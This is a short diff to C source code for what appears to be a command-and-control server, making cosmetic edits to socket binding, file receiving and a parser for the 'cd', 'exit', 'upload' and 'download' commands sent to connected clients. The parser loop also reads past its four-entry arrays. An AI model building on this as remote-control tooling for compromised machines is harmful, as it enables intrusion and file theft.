@@ -60,7 +60,7 @@ SOCKET create_socket() {
 }
 
 // Function to bind socket to specified port.
-void bind_socket(SOCKET listen_socket, int port) {
+void bind_socket(SOCKET listen_socket, const int port) {
 	// Create hint structure.
 	struct sockaddr_in hint;
 	hint.sin_family = AF_INET;
@@ -233,8 +233,7 @@ int recv_file(char* buf, size_t cmd_len, SOCKET client_socket) {
 	// Receive file size.
 	if (recv(client_socket, buf, sizeof(uint32_t), 0) < 1)
 		return SOCKET_ERROR;
-	
-	// Deserialize buf bytes.
+
 	uint32_t f_size = ntohl_conv(&*(buf));
 	int iResult = 1;
 
@@ -271,8 +270,7 @@ int terminate_client(char* buf, size_t cmd_len, SOCKET client_socket) {
 func parse_cmd(char* buf) {
 	// Function pointer array of each c2 command.
 	const func func_array[4] = { &client_cd, &terminate_client, &send_file, &recv_file };
-	// When parsing interaction input from the user we will check if the input matches any-
-	// strings in the array below.
+	// Array of strings to be parsed.
 	const char commands[4][10] = { "cd ", "exit", "upload ", "download " };
 
 	for (int i = 0; i < 5; i++) {
